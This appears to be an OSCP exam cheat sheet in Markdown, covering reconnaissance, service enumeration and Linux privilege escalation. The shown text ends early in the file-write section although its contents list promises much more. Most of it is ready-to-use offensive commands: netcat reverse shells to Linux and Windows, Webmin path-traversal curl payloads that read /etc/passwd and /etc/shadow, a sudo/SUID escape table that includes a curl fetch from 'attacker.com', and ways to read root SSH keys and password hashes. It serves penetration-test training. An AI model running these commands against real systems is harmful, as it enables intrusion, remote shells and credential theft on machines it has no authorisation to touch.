# OSCP Mother of All Notes
- [OSCP Mother of All Notes](#oscp-mother-of-all-notes)
  - [Kali Linux](#kali-linux)
  - [Information Gathering & Vulnerability Scanning](#information-gathering--vulnerability-scanning)
    - [Passive Information Gathering](#passive-information-gathering)
    - [Active Information Gathering](#active-information-gathering)
      - [Port Scanning](#port-scanning)
  - [Enumeration](#enumeration)
    - [DNS Enumeration](#dns-enumeration)
    - [NFS (Network File System) Enumeration](#nfs-network-file-system-enumeration)
    - [SMB Enumeration](#smb-enumeration)
    - [SMTP Enumeration - Mail Severs](#smtp-enumeration---mail-severs)
    - [SNMP Enumeration -Simple Network Management Protocol](#snmp-enumeration--simple-network-management-protocol)
    - [MS SQL Server Enumeration ( xp_cmdshell to execute commands )](#ms-sql-server-enumeration--xp_cmdshell-to-execute-commands-)
    - [Linux OS Enumeration](#linux-os-enumeration)
      - [Start with the basics](#start-with-the-basics)
      - [What can we EXECUTE?](#what-can-we-execute)
      - [What can we READ?](#what-can-we-read)
      - [Where can we WRITE?](#where-can-we-write)
      - [Password Hunting](#password-hunting)
      - [Kernel Exploits](#kernel-exploits)
      - [Automated Linux Enumeration Scripts](#automated-linux-enumeration-scripts)
        - [LinEmum.sh](#linemumsh)
      - [CTF Machine Tactics](#ctf-machine-tactics)
      - [Using SSH Keys](#using-ssh-keys)
    - [Windows OS Enumeration](#windows-os-enumeration)
      - [Automated Windows Enumeration Scripts](#automated-windows-enumeration-scripts)
        - [Running Windows Privesc Check (windows-privesc-check)](#running-windows-privesc-check-windows-privesc-check)
        - [Running Sherlock](#running-sherlock)
        - [Running Watson](#running-watson)
        - [Running JAWS - Just Another Windows (Enum) Script](#running-jaws---just-another-windows-enum-script)
        - [CopyAndPasteEnum.bat](#copyandpasteenumbat)
        - [CopyAndPasteFileDownloader.bat](#copyandpastefiledownloaderbat)
        - [windows_recon.bat](#windows_reconbat)
  - [File Enumeration](#file-enumeration)
  - [HTTP Enumeration ( Always search for .txt,php,asp,aspx files )](#http-enumeration--always-search-for-txtphpaspaspx-files-)
  - [Buffer Overflow](#buffer-overflow)
    - [Nmap Fuzzers](#nmap-fuzzers)
    - [Windows Buffer Overflows](#windows-buffer-overflows)
  - [Shells](#shells)
    - [Execute a remote shell dropper](#execute-a-remote-shell-dropper)
    - [Creating a fast TCP/UDP tunnel transported over HTTP secured via SSH with CHISEL](#creating-a-fast-tcpudp-tunnel-transported-over-http-secured-via-ssh-with-chisel)
    - [Upgrading your Windows Shell](#upgrading-your-windows-shell)
      - [Netcat Reverseshell Oneliners for Windows](#netcat-reverseshell-oneliners-for-windows)
      - [Upgrade Windows Command Line with a Powershell One-liner Reverse Shell](#upgrade-windows-command-line-with-a-powershell-one-liner-reverse-shell)
      - [Upgrade Shell with PowerShell Nishang](#upgrade-shell-with-powershell-nishang)
  - [File Transfers](#file-transfers)
    - [Uploading Files](#uploading-files)
      - [Uploading Files with VBScript](#uploading-files-with-vbscript)
      - [Uploading Files with CertUtil.exe](#uploading-files-with-certutilexe)
      - [Transfering Files using MSHTA](#transfering-files-using-mshta)
      - [Trasfering Files using Bitsadmin](#trasfering-files-using-bitsadmin)
      - [Uploading Files with PowerShell](#uploading-files-with-powershell)
      - [Uploading Files with Python](#uploading-files-with-python)
      - [Uploading Files with Perl](#uploading-files-with-perl)
      - [Uploading Files with curl](#uploading-files-with-curl)
      - [Uploading Files with FTP](#uploading-files-with-ftp)
      - [Transfering Files via SMB using Impacket](#transfering-files-via-smb-using-impacket)
    - [Packing Files](#packing-files)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
    - [SearchSploit](#searchsploit)
  - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [Sysinternals](#sysinternals)
    - [Windows Run As](#windows-run-as)
    - [PowerShell](#powershell)
    - [Others](#others)
    - [Windows Kernel Exploit (MS16-032)](#windows-kernel-exploit-ms16-032)
    - [Potato Attacks](#potato-attacks)
      - [RottenPotato](#rottenpotato)
      - [Juicy Potato](#juicy-potato)
    - [Fireeye Session Gopher](#fireeye-session-gopher)
    - [Running Mimikatz](#running-mimikatz)
      - [Running traditional (binary) Mimikatz](#running-traditional-binary-mimikatz)
      - [Running Powershell Mimikatz](#running-powershell-mimikatz)
    - [Capture a screen shot](#capture-a-screen-shot)
  - [Client, Web and Password Attacks](#client-web-and-password-attacks)
    - [Client Attacks](#client-attacks)
    - [Web Attacks](#web-attacks)
  - [File Inclusion Vulnerabilities](#file-inclusion-vulnerabilities)
  - [Database Vulnerabilities](#database-vulnerabilities)
    - [Detecting SQL Injection Vulnerabilities.](#detecting-sql-injection-vulnerabilities)
    - [SQLMap Examples](#sqlmap-examples)
    - [NoSQLMap Examples](#nosqlmap-examples)
  - [Password Attacks](#password-attacks)
    - [Brute Force](#brute-force)
    - [Dictionary Files](#dictionary-files)
    - [Windows Credential Editor (WCE)](#windows-credential-editor-wce)
    - [Hydra](#hydra)
    - [Password Hash Attacks](#password-hash-attacks)
      - [Hashcat](#hashcat)
      - [Passing the Hash in Windows](#passing-the-hash-in-windows)
  - [Networking, Pivoting and Tunneling](#networking-pivoting-and-tunneling)
  - [The Metasploit Framework](#the-metasploit-framework)
  - [Bypassing Antivirus Software](#bypassing-antivirus-software)
  - [Windows Commands for Linux Users](#windows-commands-for-linux-users)
    - [WAF - Web application firewall](#waf---web-application-firewall)
    - [Common web-services](#common-web-services)
  - [Loot Windows](#loot-windows)
    - [Meterpreter](#meterpreter)
    - [Dumping passwords and hashes on windows](#dumping-passwords-and-hashes-on-windows)
      - [LM Hashes](#lm-hashes)
    - [Windows Credencial Editor (WCE)](#windows-credencial-editor-wce)
    - [VNC](#vnc)
  - [TCP-dump on windows](#tcp-dump-on-windows)
    - [Meterpreter](#meterpreter-1)
  - [Recursive search](#recursive-search)
  - [Loot Linux](#loot-linux)
  - [Generate custom wordlist](#generate-custom-wordlist)
    - [Password rules](#password-rules)
  - [Windows Pre-Compiled Binaries](#windows-pre-compiled-binaries)
  - [Active Directory and/or LDAP](#active-directory-andor-ldap)
    - [Username fuzzing in ldap](#username-fuzzing-in-ldap)
    - [Password enumeration against ldap](#password-enumeration-against-ldap)
## Kali Linux

- Set the Target IP Address to the `$ip` system variable  
    `export ip=192.168.1.100`
- Find the location of a file  
    `locate sbd.exe`
- Search through directories in the `$PATH` environment variable  
    `which sbd`
- Find a search for a file that contains a specific string in it’s name:  
    `find / -name sbd\*`
- Show active internet connections  
    `netstat -lntp`
- Change Password  
    `passwd`
- Verify a service is running and listening  
    `netstat -antp |grep apache`
- Start a service  
    `systemctl start ssh`
    `systemctl start apache2`
- Have a service start at boot  
    `systemctl enable ssh`
- Stop a service  
    `systemctl stop ssh`
- Unzip a gz file  
    `gunzip access.log.gz`
- Unzip a tar.gz file  
    `tar -xzvf file.tar.gz`
- Search command history  
    `history | grep phrase_to_search_for`
- Download a webpage  
    `wget http://www.cisco.com`
- Open a webpage  
    `curl http://www.cisco.com`
- String manipulation
  - Count number of lines in file  
    - `wc -l index.html`
  - Get the start or end of a file  
    - `head index.html`
    - `tail index.html`
  - Extract all the lines that contain a string  
    - `grep "href=" index.html`
  - Cut a string by a delimiter, filter results then sort  
    - `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`
  - Using Grep and regular expressions and output to a file  
    - `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt`
  - Use a bash loop to find the IP address behind each host  
    - `for url in $(cat list.txt); do host $url; done`
  - Collect all the IP Addresses from a log file and sort by frequency  
    - `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`
- Decoding using Kali
  - Decode Base64 Encoded Values
    - `echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode`
  - Decode Hexidecimal Encoded Values  
    - `echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps`
- Netcat - Read and write TCP and UDP Packets
  - Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
    - [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)
  - Connect to a POP3 mail server  
        `nc -nv $ip 110`
  - Listen on TCP/UDP port  
        `nc -nlvp 4444`
  - Connect to a netcat port  
        `nc -nv $ip 4444`
  - Send a file using netcat  
        `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`
  - Receive a file using netcat  
        `nc -nlvp 4444 > incoming.exe`
  - Some OSs (OpenBSD) will use *nc.traditional* rather than *nc* so watch out for that...
    ```
    whereis nc
    nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz
    /bin/nc.traditional -e /bin/bash 1.2.3.4 4444
    ```
    **There is also a possibility to upload the netcat to the target machine**
  - Create a reverse shell with Ncat using cmd.exe on Windows  
    - `nc.exe -nlvp 4444 -e cmd.exe`
    or
    - `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`
  - Create a reverse shell with Ncat using bash on Linux  
    - `nc -nv $ip 4444 -e /bin/bash`
  - Netcat for Banner Grabbing:
    - `echo "" | nc -nv -w1 <IP Address> <Ports>`
- Ncat - Netcat for Nmap project which provides more security avoid IDS
  - Reverse shell from windows using cmd.exe using ssl  
        `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`
  - Listen on port 4444 using ssl  
        `ncat -v $ip 4444 --ssl`
- Wireshark
  - Show only SMTP (port 25) and ICMP traffic:
        `tcp.port eq 25 or icmp`
  - Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
        `ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16`
  - Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
        `ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip`
  - Some commands are equal
    - `ip.addr == xxx.xxx.xxx.xxx`
    Equals
    - `ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx`
    - `ip.addr != xxx.xxx.xxx.xxx`
    Equals
    - `ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx`
- Tcpdump
  - Display a pcap file  
       `tcpdump -r passwordz.pcap`
  - Display ips and filter and sort  
        `tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head`
  - Grab a packet capture on port 80  
        `tcpdump tcp port 80 -w output.pcap -i eth0`
  - Check for ACK or PSH flag set in a TCP packet  
        `tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap`

## Information Gathering & Vulnerability Scanning

### Passive Information Gathering

- Google Hacking
  - Google search to find website sub domains `site:microsoft.com`
  - Google filetype, and intitle `intitle:"netbotz appliance" "OK" -filetype:pdf`
  - Google inurl  `inurl:"level/15/sexec/-/show"`
  - Google Hacking Database:<https://www.exploit-db.com/google-hacking-database/>
- SSL Certificate Testing[https://www.ssllabs.com/ssltest/analyze.html](https://www.ssllabs.com/ssltest/analyze.html)
- Email Harvesting
  - Simply Email  
    - `git clone https://github.com/killswitch-GUI/SimplyEmail.git`
    - `./SimplyEmail.py -all -e TARGET-DOMAIN`
  - We can use the varvester too to search for emails.
- Netcraft
  - Determine the operating system and tools used to build a site <https://searchdns.netcraft.com/>

- Whois Enumeration  
  - `whois domain-name-here.com`
  - `whois $ip`
- Banner Grabbing
  - `nc -v $ip 25`
  - `telnet $ip 25`
  - `nc TARGET-IP 80`
- Recon-ng - full-featured web reconnaissance framework written in Python

  ```shell
  cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git
  cd /opt/recon-ng
  ./recon-ng
  show modules
  help
  ```

### Active Information Gathering

#### Port Scanning

*Subnet Reference Table*

/ | Addresses | Hosts | Netmask | Amount of a Class C
--- | --- | --- | --- | ---
/30 | 4 | 2 | 255.255.255.252| 1/64
/29 | 8 | 6 | 255.255.255.248 | 1/32
/28 | 16 | 14 | 255.255.255.240 | 1/16
/27 | 32 | 30 | 255.255.255.224 | 1/8
/26 | 64 | 62 | 255.255.255.192 | 1/4
/25 | 128 | 126 | 255.255.255.128 | 1/2
/24 | 256 | 254 | 255.255.255.0 | 1
/23 | 512 | 510 | 255.255.254.0 | 2
/22 | 1024 | 1022 | 255.255.252.0 | 4
/21 | 2048 | 2046 | 255.255.248.0 | 8
/20 | 4096 | 4094 | 255.255.240.0 | 16
/19 | 8192 | 8190 | 255.255.224.0 | 32
/18 | 16384 | 16382 | 255.255.192.0 | 64
/17 | 32768 | 32766 | 255.255.128.0 | 128
/16 | 65536 | 65534 | 255.255.0.0 | 256

- Set the ip address as a variable  
  - `export ip=192.168.1.100`
  - `nmap -A -T4 -p- $ip`
  - `autorecon $ip -p 22,8080 --single-target --only-scan-dir --no-port-dir --dirbuster.tool dirsearch`
- Netcat port Scanning  
  - `nc -nvv -w 1 -z $ip 3388-3390`
- Discover active IPs usign ARP on the network:
  - `arp-scan $ip/24`
- Discover who else is on the network  
  - `netdiscover`
- Discover IP Mac and Mac vendors from ARP  
  - `netdiscover -r $ip/24`
- Nmap stealth scan using SYN  
  - `nmap -sS $ip`
- Nmap stealth scan using FIN  
  - `nmap -sF $ip`
- Nmap Banner Grabbing  
  - `nmap -sV -sT $ip`
- Nmap OS Fingerprinting  
  - `nmap -O $ip`
- Nmap Regular Scan:  
  - `nmap $ip/24`
- Enumeration Scan  
  - `nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt`
- Enumeration Scan All Ports TCP / UDP and output to a txt file  
  - `nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip`
- Nmap output to a file:  
  - `nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24`
- Quick Scan:  
  - `nmap -T4 -F $ip/24`
- Quick Scan Plus:  
  - `nmap -sV -T4 -O -F --version-light $ip/24`
- Quick traceroute  
  - `nmap -sn --traceroute $ip`
- All TCP and UDP Ports  
  - `nmap -v -sU -sS -p- -A -T4 $ip`
- Intense Scan:  
  - `nmap -T4 -A -v $ip`
- Intense Scan Plus UDP  
  - `nmap -sS -sU -T4 -A -v $ip/24`
- Intense Scan ALL TCP Ports  
  - `nmap -p 1-65535 -T4 -A -v $ip/24`
- Intense Scan - No Ping  
  - `nmap -T4 -A -v -Pn $ip/24`
- Ping scan  
  - `nmap -sn $ip/24`
- Slow Comprehensive Scan  
  - `nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24`
- Scan with Active connect in order to weed out any spoofed ports designed to troll you  
  - `nmap -p1-65535 -A -T5 -sT $ip`

## Enumeration

### DNS Enumeration

- NMAP DNS Hostnames Lookup
      `nmap -F --dns-server <dns server ip> <target ip range>`
- Host Lookup  
      `host -t ns megacorpone.com`
- Reverse Lookup Brute Force - find domains in the same range ( This can be done when you have a domain and found a range of ips, you will do this in the intermediary portion of those ips )  
      `for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"`
- Perform DNS IP Lookup  
      `dig a domain-name-here.com @nameserver`
- Perform MX Record Lookup  
      `dig mx domain-name-here.com @nameserver`
- Perform Zone Transfer with DIG  
      `dig axfr domain-name-here.com @nameserver`
- DNS Zone Transfers  
  - Windows DNS zone transfer  
      `nslookup -> set type=any -> ls -d blah.com`
  - Linux DNS zone transfer  
      `dig axfr blah.com @ns1.blah.com`
- Dnsrecon DNS Brute Force  
      `dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`
- Dnsrecon DNS List of megacorp  
      `dnsrecon -d megacorpone.com -t axfr`
- DNSEnum  
      `dnsenum zonetransfer.me`
- NMap Enumeration Script List:
- NMap Discovery  
      [*https://nmap.org/nsedoc/categories/discovery.html*](https://nmap.org/nsedoc/categories/discovery.html)
- Nmap port version detection MAXIMUM power  
      `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>`

### NFS (Network File System) Enumeration

- Show Mountable NFS Shares
    - `nmap -sV --script=nfs-showmount $ip`
  - Show all mountable shares on the victim
    - `showmount -e $ip` *show mount is part of nfs-common package(>apt-get install nfs-common)*
  - Show all mounted shares to the box, this is good for linux boxes if the victim is using file server as share
    - `showmount -a $ip`

- Mounting an NFS to the mount point
  - `sudo mkdir /mnt/<dirname>`
  - `sudo mount -t nfs $ip:/<shared name> /mnt/<dirname>`

- RPC (Remote Procedure Call) Enumeration
  - Connect to an RPC share without a username and password and enumerate privledges
    - `rpcclient --user="" --command=enumprivs -N $ip`
  - Connect to an RPC share with a username and enumerate privledges
    - `rpcclient --user="<Username>" --command=enumprivs $ip`

### SMB Enumeration

- SMB OS Discovery  
  - `nmap $ip --script smb-os-discovery.nse`
- Nmap port scan  
  - `nmap -v -p 139,445 -oG smb.txt $ip-254`
- Netbios Information Scanning  
  - `nbtscan -r $ip/24`
- Nmap find exposed Netbios servers  
  - `nmap -sU --script nbstat.nse -p 137 $ip`
- Nmap all SMB scripts scan
  - `nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
- Nmap all SMB scripts authenticated scan
  - `nmap -sV -Pn -vv -p 445  --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
- SMB Enumeration Tools  
  - `nmblookup -A $ip`
  - `smbclient //MOUNT/share -I $ip -N`
  - `rpcclient -U "" $ip`
  - `enum4linux $ip`
  - `enum4linux -a $ip`
  - `crackmapexec smb $ip --shares`
- SMB Finger Printing  
  - `smbclient -L //$ip`
- Nmap Scan for Open SMB Shares  
  - `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24`
- Nmap scans for vulnerable SMB Servers  
  - `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`
- Nmap List all SMB scripts installed  
  - `ls -l /usr/share/nmap/scripts/smb*`
- Enumerate SMB Users
  - `nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14`
  OR
  - `python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip`
- RID Cycling - Null Sessions  
  - `ridenum.py $ip 500 50000 dict.txt`
- Manual Null Session Testing
  - Windows: `net use \\$ip\IPC$ "" /u:""`
  - Linux: `smbclient -L //$ip`

### SMTP Enumeration - Mail Severs

- Verify SMTP port using Netcat  
  - `nc -nv $ip 25`
- POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet

      ```
      root@kali:~# telnet $ip 110
      +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
      USER billydean    
      +OK
      PASS password
      +OK Welcome billydean

      list

      +OK 2 1807
      1 786
      2 1021

      retr 1

      +OK Message follows
      From: jamesbrown@motown.com
      Dear Billy Dean,

      Here is your login for remote desktop ... try not to forget it this time!
      username: billydean
      password: PA$$W0RD!Z
      ```

### SNMP Enumeration -Simple Network Management Protocol

- Fix SNMP output values so they are human readable  
  - `apt-get install snmp-mibs-downloader download-mibs`
  - `echo "" > /etc/snmp/snmp.conf`

- SNMP Enumeration Commands
  - `snmpcheck -t $ip -c public`
  - `snmpwalk -c public -v1 $ip 1|`
  - `grep hrSWRunName|cut -d\* \* -f`
  - `snmpenum -t $ip`
  - `onesixtyone -c names -i hosts`
- SNMPv3 Enumeration  
  - `nmap -sV -p 161 --script=snmp-info $ip/24`
- Automate the username enumeration process for SNMPv3:  
  - `apt-get install snmp snmp-mibs-downloader`
  - `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`
- SNMP Default Credentials  
  - `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`
### MS SQL Server Enumeration ( xp_cmdshell to execute commands )

- Nmap Information Gathering

      `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip`

- Webmin and miniserv/0.01 Enumeration - Port 10000
  - Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
   - `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`

  - Test to see if webmin is running as root by grabbing /etc/shadow
    - `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`

### Linux OS Enumeration 

- List all SUID files  
      `find / -perm -4000 2>/dev/null`
- Determine the current version of Linux  
      `cat /etc/issue`
- Determine more information about the environment  
      `uname -a`
- List processes running  
      `ps -xaf`
- List the allowed (and forbidden) commands for the invoking use  
      `sudo -l`
- List iptables rules  
    
    ```
    iptables --table nat --list  
    iptables -vL -t filter  
    iptables -vL -t nat  
    iptables -vL -t mangle  
    iptables -vL -t raw  
    iptables -vL -t security
    ```

#### Start with the basics

1. Check **who** you are, which **privileges** do you have, which **users** are in the systems, which ones can **login** and which ones have **root privileges:**  

  ```shell
  #Info about me  Who am i and what groups do I belong to?
  id || (whoami && groups) 2>/dev/null  
  #List all users  
  cat /etc/passwd | cut -d: -f1  
  #List users with console  
  cat /etc/passwd | grep "sh$"  
  #List superusers  
  awk -F: '($3 == "0") {print}' /etc/passwd  
  #Currently logged users  
  w
  #Login history  
  last | tail  
  #Last log of each user  
  lastlog  
  #List all users and their groups  
  for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done
  2>/dev/null | sort  
  #Current user PGP keys  
  gpg --list-keys 2&gt;/dev/null

  #Who else is on this box (lateral movement)?
  ls -la /home
  cat /etc/passwd
  ```

2. What Kernel version and distro are we working with here?
  - `uname -a`
  - `cat /etc/issue`

3. What new processes are running on the server (Thanks to IPPSEC for the script!):

```shell
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

4. We can also use pspy on linux to monitor the processes that are starting up and running: <https://github.com/DominicBreuker/pspy>

5. Check the services that are listening: `bash ss -lnpt`

#### What can we EXECUTE?

6. Who can execute code as root (probably will get a permission denied)?
  - `cat /etc/sudoers`
7. Can I execute code as root (you will need the user's password)?
  - `sudo -l`

8. What executables have SUID bit that can be executed as another user?

  ```shell
  find / -type f -user root -perm /u+s -ls 2>/dev/null
  find / -user root -perm -4000 -print 2>/dev/null
  find / -perm -u=s -type f 2>/dev/null
  find / -user root -perm -4000 -exec ls -ldb {};
  ```

9. Do you have any capabilities available? `getcap -r / 2>/dev/null`

10. Do any of the SUID binaries run commands that are vulnerable to file path manipulation?

  ```shell
  strings /usr/local/bin/binaryelf
  mail
  echo "/bin/sh" > /tmp/mail cd /tmp
  export PATH=.
  /usr/local/bin/binaryelf
  ```

11. Do any of the SUID binaries run commands that are vulnerable to Bash Function Manipulation?

 ```shell
  strings /usr/bin/binaryelf
  mail function /usr/bin/mail() { /bin/sh; }
  export -f /usr/bin/mail
  /usr/bin/binaryelf
  ```

12. Can I write files into a folder containing a SUID bit file?
  - Might be possible to take advantage of a '.' in the **PATH** or an **The IFS** (or Internal Field Separator) Exploit.

13. If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:

| SUID / SUDO Executables               | Priv Esc Command (will need to prefix with sudo if you are using sudo for priv esc. |
|---------------------------------------|-------------------------------------------------------------------------------------|
| (ALL : ALL ) ALL                      | You can run any command as root.<br> sudo su - <br> sudo /bin/bash                    |
| nmap <br> (older versions 2.02 to 5.21)  | nmap --interactive <br> !sh                                                           |
| netcat <br> nc <br> nc.traditional          | nc -nlvp 4444 & <br> nc -e /bin/bash 127.0.0.1 4444                                  |
| ncat                                  |                                                                                     |
| awk <br> gawk                            | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
| python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
| php                                   |  CMD="/bin/sh" sudo php -r "system('$CMD');"                                        |
| find                                  | find /home -exec nc -lvp 4444 -e /bin/bash; <br> find /home -exec /bin/bash;           |
| xxd                                   | LFILE=file_to_read sudo xxd "$LFILE" | xxd -r                                       |
| vi                                    | sudo vi -c ':!/bin/sh' /dev/null                                                    |
| more                                  | TERM= sudo more /etc/profile <br> !/bin/sh                                         |
| less                                  | sudo less /etc/profile <br> !/bin/sh                                               |
| nano                                  | sudo nano <br> ^R^X <br> reset; sh 1>&0 2>&0                                       |
| cp                                    | sudo cp /bin/sh /bin/cp <br> sudo cp                                               |
| cat                                   | LFILE=file_to_read <br> sudo cat "$LFILE"                                          |
| bash                                  | sudo bash                                                                          |
| ash                                  |  sudo ash                                                                           |
| sh                                   | |
| csh                                  | |
| curl                                 | URL=<http://attacker.com/file_to_get> <br> LFILE=file_to_save <br> sudo curl $URL -o $LFILE |
| dash                                 | |
| pico                                 | sudo pico <br> ^R^X <br> reset; sh 1>&0 2>&0                                         |
| nano                                 |  sudo nano <br> ^R^X <br> reset; sh 1>&0 2>&0                                        |
| tclsh                                | sudo tclsh <br> exec /bin/sh <@stdin >@stdout 2>@stderr                              |
| git                                  | sudo PAGER='sh -c "exec sh 0<&1"' git -p help <br> or <br> sudo git -p help config <br> !/bin/sh |
| scp                                  | TF=$(mktemp) <br> echo `'sh 0<&2 1>&2' > $TF` <br> chmod +x "$TF" <br> sudo scp -S $TF x y: |
| expect                               | sudo expect -c 'spawn /bin/sh;interact'                                              |
| ftp                                  | sudo ftp <br> !/bin/sh                                                               |
| socat                                | sudo socat stdin exec:/bin/sh                                                        |
| script                               | sudo script -q /dev/null                                                             |
| ssh                                  | sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x                                           |
| zsh                                  | sudo zsh                                                                             |
| tclsh                                | sudo tclsh <br> exec /bin/sh <@stdin >@stdout 2>@stderr                              |
| strace                               |  Write and compile a a SUID SUID binary c++ program <br> strace chown root:root suid <br> strace chmod u+s suid <br> ./suid        |
| npm                                  |  ln -s /etc/shadow package.json && sudo /usr/bin/npm i *                            |
| rsync                                |                                                                                     |
| tar                                  |                                                                                     |
|Screen-4.5.00     | <https://www.exploit-db.com/exploits/41154/>        |

*Note:* You can find an incredible list of Linux binaries that can lead to privledge escalation at the [GTFOBins](https://gtfobins.github.io/) project website.

14. Can I access services that are running as root on the local network?

  ```shell
  netstat -antup
  ps -aux | grep root
  ```

| Network Services Running as Root      | Exploit actions                                                                     |
|---------------------------------------|-------------------------------------------------------------------------------------|
| mysql                                 | raptor_udf2 exploit <br> 0xdeadbeef.info/exploits/raptor_udf2.c <br> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));                   |
| apache            | drop a reverse shell script on to the webserver                                     |
| nfs             | no_root_squash parameter <br> Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
| PostgreSQL                            | <https://www.exploit-db.com/exploits/45184/>                                          |

15. Are there any active tmux sessions we can connect to? `tmux ls`

#### What can we READ?

16. What files and folders are in my home user's directory? `ls -la ~`
17. Do any users have passwords stored in the passwd file? `cat /etc/passwd`
18. Are there passwords for other users or RSA keys for SSHing into the box? `ssh -i id_rsa root@10.10.10.10`
19. Are there configuration files that contain credentials?

| Application and config file           | Config File Contents                                                                |
|---------------------------------------|-------------------------------------------------------------------------------------|
| WolfCMS <br> config.php               | // Database settings: <br> define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306'); <br> define('DB_USER', 'root'); <br> define('DB_PASS', 'john@123');<br>        |
| Generic PHP Web App                   | define('DB_PASSWORD', 's3cret');                                                     |
| .ssh directory           | authorized_keys <br> id_rsa <br> id_rsa.keystore <br> id_rsa.pub <br> known_hosts            |
| User MySQL Info                 | .mysql_history <br> .my.cnf                     |
| User Bash History                  | .bash_history                                      |

20. Are any of the discovered credentials being reused by multiple acccounts?
  - `sudo - username`
  - `sudo -s`
21. Are there any Cron Jobs Running? `cat /etc/crontab`
22. What files have been modified most recently?

  ```shell
  find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r
  find /home -type f -mmin -60
  find / -type f -mtime -2
  ```

23. Is the user a member of the Disk group and can we read the contents of the file system?
  
  ```shell
  debugfs /dev/sda
  debugfs: cat /root/.ssh/id_rsa
  debugfs: cat /etc/shadow
  ```

24. Is the user a member of the Video group and can we read the Framebuffer?
  
  ```shell
  cat /dev/fb0 > /tmp/screen.raw
  cat /sys/class/graphics/fb0/virtual_size
  ```

#### Where can we WRITE?

25. What are all the files can I write to? `find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 2>/dev/null`

26. What folder can I write to? `find / -regextype posix-extended -regex "/(sys|srv|proc|usr|lib|var)" -prune -o -type d -writable 2>/dev/null`

| Writable Folder / file    | Priv Esc Command                                                                                |
|---------------------------|-------------------------------------------------------------------------------------------------|
| /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
